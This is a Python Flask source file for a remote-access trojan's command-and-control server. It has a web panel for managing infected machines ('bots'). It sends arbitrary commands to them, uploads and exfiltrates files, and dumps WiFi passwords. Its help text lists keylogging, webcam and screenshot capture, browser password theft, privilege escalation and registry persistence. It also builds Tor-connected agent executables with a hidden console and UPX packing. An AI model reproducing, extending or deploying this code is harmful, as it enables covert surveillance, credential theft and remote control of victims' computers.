from flask import Flask, render_template, jsonify, request, send_from_directory
import json
import os
import socket
from bot import Bot
from title import title
import threading
from werkzeug.utils import secure_filename
from datetime import datetime
import logging
import signal
import sys
import subprocess
import uuid

# Add the current directory to Python path
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

from build_agent import setup_build_environment, append_address

app = Flask(__name__)

# Global variables
start_flag = True
sock = None
t1 = None

# Add these constants after the existing ones
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'exe'}
HELP_TEXT = '''
Available Commands:
------------------
Basic Commands:
  help                  --> Show this help message
  quit                  --> Quit Session With The Target
  clear                 --> Clear The Screen
  cd <directory>        --> Changes Directory On Target System

File Operations:
  upload <file>         --> Upload File To The Target Machine From uploads/ Directory
  download <file>       --> Download File From Target Machine
  get <url>            --> Download File From Specified URL to Target ./

Surveillance:
  screenshot           --> Takes screenshot and sends to server ./images/screenshots/
  webcam              --> Takes image with webcam and sends to ./images/webcam/
  keylog_start        --> Start The Keylogger
  keylog_dump         --> Print Keystrokes From taskmanager.txt
  keylog_stop         --> Stop And Self Destruct Keylogger File
  chrome_pass         --> Retrieves Browser Saved Passwords

System Commands:
  start <program>      --> Spawn Program Using backdoor (e.g. 'start notepad')
  check               --> Check If Has Administrator Privileges
  privilege           --> Attempt to escalate privileges
  remove_backdoor     --> Removes backdoor from target

Windows Specific:
  persistence <RegName> <filename>  --> Create Persistence In Registry
'''

# Add this configuration after creating the Flask app
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Set up logging after Flask app creation
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)

def initialise_socket():
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', 5555))
    sock.listen(5)
    sock.settimeout(5)  # Set timeout for accept()
    return sock

def accept_connections():
    logging.info("C2 Server started and listening for connections...")
    while True:
        if not start_flag:
            break
        try:
            target, ip = sock.accept()
            try:
                bot = Bot(target, ip)
                # Get OS info from client
                bot.reliable_send('sysinfo')
                try:
                    response = bot.reliable_recv()
                    if response:
                        bot.os_type = response.get('os', 'Unknown')
                        bot.hostname = response.get('hostname', 'Unknown')
                        bot.username = response.get('username', 'Unknown')
                        bot.is_admin = response.get('is_admin', False)
                except Exception as e:
                    logging.error(f"Error getting system info: {e}")
                
                logging.info(f"New agent connected - IP: {ip[0]}:{ip[1]} | OS: {bot.os_type} | Session ID: {bot.id}")
                print(f"\n[+] New agent connected from {ip[0]}:{ip[1]}")
                print(f"[*] Session ID: {bot.id}")
                print(f"[*] OS: {bot.os_type}")
                print(f"[*] Hostname: {bot.hostname}")
                print('[**] Command & Control Center: ', end="")
                
            except Exception as e:
                logging.error(f"Error creating bot instance: {e}")
                if target:
                    target.close()
                
        except socket.timeout:
            continue
        except Exception as e:
            logging.error(f"Error accepting connection: {e}")

@app.route('/') 
def index():
    return render_template('index.html', title=title())

@app.route('/api/targets')
def get_targets():
    targets = []
    for bot_id in Bot.botList:
        bot = Bot.botList[bot_id]
        target_data = {
            'id': bot.id,
            'ip': str(bot.ip),
            'alias': bot.alias,
            'connected_time': bot.connected_time.isoformat(),
            'last_seen': bot.last_seen.isoformat(),
            'os_type': bot.os_type,
            'hostname': bot.hostname,
            'username': bot.username,
            'is_admin': bot.is_admin
        }
        targets.append(target_data)
    return jsonify(targets)

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        return jsonify({'message': f'File {filename} uploaded successfully',
                       'path': filepath})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    """Handle commands including file operations through command interface"""
    data = request.get_json()
    try:
        session_id = int(data.get('session_id'))
        command = data.get('command')
    except (TypeError, ValueError):
        return jsonify({'error': 'Invalid request data'}), 400
    
    if session_id not in Bot.botList:
        return jsonify({'error': 'Invalid session ID'}), 400
        
    bot = Bot.botList[session_id]
    try:
        # Handle screenshot command
        if command == 'screenshot':
            success, message, filepath = bot.screenshot()
            if success and filepath:
                return jsonify({
                    'success': True,
                    'message': message,
                    'output': f"Screenshot saved to: {filepath}"
                })
            else:
                return jsonify({'error': message}), 500
                
        # Handle file upload/download commands
        elif command.startswith('upload '):
            filename = command[7:]  # Get filename after 'upload '
            try:
                with open(filename, 'rb') as f:
                    file_data = f.read()
                # Only pass file_data and basename of the file
                success, message = bot.upload_file(file_data, os.path.basename(filename))
                return jsonify({
                    'success': success,
                    'output': message
                })
            except FileNotFoundError:
                return jsonify({
                    'error': f'File not found: {filename}'
                }), 404
            except Exception as e:
                return jsonify({
                    'error': f'Upload error: {str(e)}'
                }), 500

        elif command.startswith('download '):
            filename = command[9:]  # Get filename after 'download '
            try:
                # Unpack exactly 3 values
                success, message, file_data = bot.download_file(filename)
                if success and file_data is not None:
                    # Save the file in downloads directory
                    os.makedirs('downloads', exist_ok=True)
                    save_path = os.path.join('downloads', os.path.basename(filename))
                    with open(save_path, 'wb') as f:
                        f.write(file_data)
                    return jsonify({
                        'success': True,
                        'output': message,
                        'path': save_path
                    })
                else:
                    return jsonify({
                        'error': message
                    }), 500
            except ValueError as e:
                logging.error(f"Value error in download: {str(e)}")
                return jsonify({'error': 'Invalid response from agent'}), 500
            except Exception as e:
                logging.error(f"Download error: {str(e)}")
                return jsonify({'error': f'Download error: {str(e)}'}), 500

        # For quit command
        elif command == 'quit':
            try:
                bot.kill()
                logging.info(f"Agent {session_id} terminated")
                return jsonify({
                    'success': True,
                    'message': 'Agent terminated'
                })
            except Exception as e:
                logging.error(f"Error during termination of agent {session_id}: {e}")
                if session_id in Bot.botList:
                    Bot.botList[session_id].cleanup()
                return jsonify({
                    'success': True,
                    'message': 'Agent forcefully terminated'
                })

        # For other commands
        else:
            bot.reliable_send(command)
            response = bot.reliable_recv()
            
            if response is None:
                bot.cleanup()
                return jsonify({
                    'error': 'Connection lost'
                }), 500
            
            bot.update_last_seen()
            logging.info(f"Command executed on Session {session_id} ({bot.ip}): {command}")
            
            return jsonify({
                'success': True,
                'output': response
            })
            
    except Exception as e:
        logging.error(f"Command execution error: {str(e)}")
        if session_id in Bot.botList:
            Bot.botList[session_id].cleanup()
        return jsonify({
            'error': f'Command execution failed: {str(e)}'
        }), 500

@app.route('/api/set_alias', methods=['POST'])
def set_alias():
    data = request.get_json()
    session_id = data.get('session_id')
    new_alias = data.get('alias')
    
    if session_id not in Bot.botList:
        return jsonify({'error': 'Invalid session ID'}), 400
        
    Bot.botList[session_id].alias = new_alias
    return jsonify({'message': 'Alias updated successfully'})

def start_server():
    global sock, t1
    sock = initialise_socket()
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    logging.info("Server started successfully")

# Add these functions for graceful shutdown
def signal_handler(sig, frame):
    logging.info("Received shutdown signal, cleaning up...")
    shutdown_server()
    sys.exit(0)

def shutdown_server():
    global start_flag, sock, t1
    logging.info("Initiating server shutdown...")
    
    # Stop accepting new connections
    start_flag = False
    
    # Close all active sessions
    for session_id in list(Bot.botList.keys()):
        try:
            Bot.botList[session_id].kill()
            logging.info(f"Terminated session {session_id}")
        except Exception as e:
            logging.error(f"Error terminating session {session_id}: {e}")
    
    # Close the socket
    if sock:
        try:
            sock.close()
            logging.info("Closed main socket")
        except Exception as e:
            logging.error(f"Error closing socket: {e}")
    
    # Wait for accept thread to finish
    if t1 and t1.is_alive():
        try:
            t1.join(timeout=5)
            logging.info("Accept thread terminated")
        except Exception as e:
            logging.error(f"Error joining accept thread: {e}")
    
    logging.info("Server shutdown complete")


#################AGENT BUILDING##########################
# Add these routes
@app.route('/api/build_agent', methods=['POST'])
def build_agent():
    data = request.get_json()
    build_id = str(uuid.uuid4())
    
    # Start build process in background
    thread = threading.Thread(
        target=build_agent_process,
        args=(build_id, data)
    )
    thread.start()
    
    return jsonify({
        'status': 'building',
        'build_id': build_id
    })

@app.route('/api/build_status/<build_id>')
def build_status(build_id):
    status = get_build_status(build_id)
    return jsonify(status)

@app.route('/download/<filename>')
def download_file(filename):
    return send_from_directory('dist', filename)

# Build process tracking
build_processes = {}

def build_agent_process(build_id, data):
    try:
        build_processes[build_id] = {
            'state': 'building',
            'progress': 0,
            'status': 'Setting up build environment...'
        }
        
        # Setup build environment
        if not setup_build_environment(data['language']):
            raise Exception("Failed to setup build environment")
        
        # Create agent configuration
        agent_config = {
            'language': data['language'],
            'onion_address': data['onion_address'],
            'port': data['port'],
            'skills': data['skills']
        }
        
        # Write configuration
        with open('agent_config.json', 'w') as f:
            json.dump(agent_config, f)
            
        build_processes[build_id]['progress'] = 20
        build_processes[build_id]['status'] = 'Building agent...'
        
        # Build command based on language
        if data['language'] == 'python':
            cmd = [
                'pyinstaller',
                'agent.py',
                '--onefile',
                '--clean',
                '--add-data=agent_config.json;.'
            ]
        else:  # C++
            cmd = [
                'g++',
                'agent.cpp',
                '-o',
                'agent',
                '-std=c++17'
            ]
        
        # Add platform specific options
        if data['language'] == 'python':
            if data['options']['noconsole']:
                cmd.append('--noconsole')
                
            if data['platform'] == 'windows':
                cmd.extend(['--add-data=torbundle;torbundle'])
                if data['options']['upx']:
                    cmd.extend(['--upx-dir=upx-3.96-win64'])
            else:
                cmd.extend(['--add-data=torbundle:torbundle'])
        
        # Run build
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        stdout, stderr = process.communicate()
        
        if process.returncode != 0:
            raise Exception(stderr.decode())
            
        build_processes[build_id]['progress'] = 80
        build_processes[build_id]['status'] = 'Finalizing build...'
        
        # Get output filename
        output_file = os.path.join('dist', 'agent.exe' if data['platform'] == 'windows' else 'agent')
        
        # Append address to executable
        if not append_address(output_file, data['onion_address'], int(data['port'])):
            raise Exception("Failed to append address to executable")
        
        build_processes[build_id] = {
            'state': 'complete',
            'progress': 100,
            'status': 'Build complete',
            'filename': 'agent.exe' if data['platform'] == 'windows' else 'agent'
        }
        
    except Exception as e:
        build_processes[build_id] = {
            'state': 'error',
            'progress': 0,
            'status': 'Build failed',
            'error': str(e)
        }

def get_build_status(build_id):
    return build_processes.get(build_id, {
        'state': 'error',
        'progress': 0,
        'status': 'Build not found'
    })

######################################################

@app.route('/api/storage')
def get_storage():
    storage_data = {
        'downloads': get_files_in_directory('downloads'),
        'screenshots': get_files_in_directory('images/screenshots')
    }
    return jsonify(storage_data)

@app.route('/api/download_storage_file')
def download_storage_file():
    path = request.args.get('path')
    if not path or not is_safe_path(path):
        return jsonify({'error': 'Invalid file path'}), 400
        
    try:
        return send_file(path, as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/delete_file', methods=['POST'])
def delete_file():
    data = request.get_json()
    path = data.get('path')
    
    if not path or not is_safe_path(path):
        return jsonify({'error': 'Invalid file path'}), 400
        
    try:
        os.remove(path)
        return jsonify({'message': 'File deleted successfully'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def get_files_in_directory(directory):
    files = []
    if os.path.exists(directory):
        for filename in os.listdir(directory):
            filepath = os.path.join(directory, filename)
            if os.path.isfile(filepath):
                # Get file extension
                _, ext = os.path.splitext(filename)
                files.append({
                    'name': filename,
                    'path': filepath,
                    'size': os.path.getsize(filepath),
                    'modified': os.path.getmtime(filepath),
                    'type': ext.lower()[1:] if ext else ''
                })
    return files

def is_safe_path(path):
    base_dir = os.path.abspath(os.path.dirname(__file__))
    file_path = os.path.abspath(path)
    return base_dir in file_path

@app.route('/api/force_remove_agent', methods=['POST'])
def force_remove_agent():
    data = request.get_json()
    session_id = int(data.get('session_id'))
    
    if session_id not in Bot.botList:
        return jsonify({'error': 'Invalid session ID'}), 400
        
    try:
        # Use the cleanup method to ensure removal
        Bot.botList[session_id].cleanup()
        logging.info(f"Agent {session_id} forcefully removed")
        return jsonify({
            'success': True,
            'message': 'Agent forcefully removed'
        })
    except Exception as e:
        logging.error(f"Error forcing removal of agent {session_id}: {e}")
        # Double check cleanup
        if session_id in Bot.botList:
            try:
                Bot.botList[session_id].cleanup()
            except:
                del Bot.botList[session_id]
        return jsonify({
            'error': f'Force removal failed: {str(e)}'
        }), 500

@app.route('/api/send_file', methods=['POST'])
def send_file_to_agent():
    """Handle file upload to agent through GUI interface"""
    try:
        session_id = int(request.form.get('session_id'))
        if 'file' not in request.files:
            return jsonify({'error': 'No file part'}), 400
            
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No selected file'}), 400
            
        if session_id not in Bot.botList:
            return jsonify({'error': 'Invalid session ID'}), 400
            
        bot = Bot.botList[session_id]
        
        # Read file data directly from the uploaded file
        file_data = file.read()
        # Ensure we only use the basename of the file
        filename = os.path.basename(secure_filename(file.filename))
        
        # Call upload_file with only file_data and filename
        success, message = bot.upload_file(file_data, filename)
        
        if success:
            return jsonify({
                'success': True,
                'message': message
            })
        else:
            return jsonify({
                'error': message
            }), 500
            
    except Exception as e:
        logging.error(f"Error in file upload: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/download_file', methods=['POST'])
def download_file_from_agent():
    """Handle file download from agent through GUI interface"""
    try:
        data = request.get_json()
        session_id = int(data.get('session_id'))
        filename = data.get('filename')
        
        if not filename:
            return jsonify({'error': 'No filename provided'}), 400
            
        if session_id not in Bot.botList:
            return jsonify({'error': 'Invalid session ID'}), 400
            
        bot = Bot.botList[session_id]
        
        # Download file from agent
        try:
            # Unpack exactly 3 values
            success, message, file_data = bot.download_file(filename)
            
            if not success or file_data is None:
                return jsonify({'error': message}), 500
                
            # Create downloads directory if it doesn't exist
            os.makedirs('downloads', exist_ok=True)
            
            # Save the file
            save_path = os.path.join('downloads', os.path.basename(filename))
            with open(save_path, 'wb') as f:
                f.write(file_data)
                
            return jsonify({
                'success': True,
                'message': message,
                'path': save_path
            })
        except ValueError as e:
            logging.error(f"Value error in download: {str(e)}")
            return jsonify({'error': 'Invalid response from agent'}), 500
        except Exception as e:
            logging.error(f"Error downloading file: {str(e)}")
            return jsonify({'error': f'Download error: {str(e)}'}), 500
            
    except Exception as e:
        logging.error(f"Error in file download request: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/preview_file')
def preview_file():
    """Handle file preview requests"""
    try:
        path = request.args.get('path')
        if not path or not is_safe_path(path):
            return jsonify({'error': 'Invalid file path'}), 400
            
        if not os.path.exists(path):
            return jsonify({'error': 'File not found'}), 404
            
        # Get file extension
        _, ext = os.path.splitext(path)
        if ext.lower() not in ['.png', '.jpg', '.jpeg', '.gif']:
            return jsonify({'error': 'Unsupported file type'}), 400
            
        # Set correct mime type
        mime_types = {
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif'
        }
        
        return send_file(
            path,
            mimetype=mime_types.get(ext.lower(), 'application/octet-stream'),
            as_attachment=False,
            download_name=os.path.basename(path)
        )
        
    except Exception as e:
        logging.error(f"Error in preview_file: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/wifi_dump', methods=['POST'])
def wifi_dump():
    """Handle WiFi password dumping"""
    data = request.get_json()
    try:
        session_id = int(data.get('session_id'))
        if session_id not in Bot.botList:
            return jsonify({'error': 'Invalid session ID'}), 400
            
        bot = Bot.botList[session_id]
        
        # Send wifi_dump command
        bot.reliable_send('wifi_dump')
        response = bot.reliable_recv()
        
        if not response:
            return jsonify({'error': 'No response from agent'}), 500
            
        if response.get('error'):
            return jsonify({'error': response['error']}), 500
            
        # Create dumps directory if it doesn't exist
        dumps_dir = os.path.join('dumps', 'wifi')
        os.makedirs(dumps_dir, exist_ok=True)
        
        # Save WiFi data to file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'wifi_dump_{session_id}_{timestamp}.json'
        filepath = os.path.join(dumps_dir, filename)
        
        with open(filepath, 'w') as f:
            f.write(response['wifi_data'])
            
        return jsonify({
            'success': True,
            'message': response.get('message', 'WiFi passwords dumped successfully'),
            'path': filepath
        })
        
    except Exception as e:
        logging.error(f"Error in wifi_dump: {str(e)}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    try:
        # Register signal handler
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Start server
        start_server()
        logging.info("Server started successfully")
        
        # Run Flask app
        app.run(debug=True, use_reloader=False)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        shutdown_server()
    finally:
        logging.info("Server stopped") 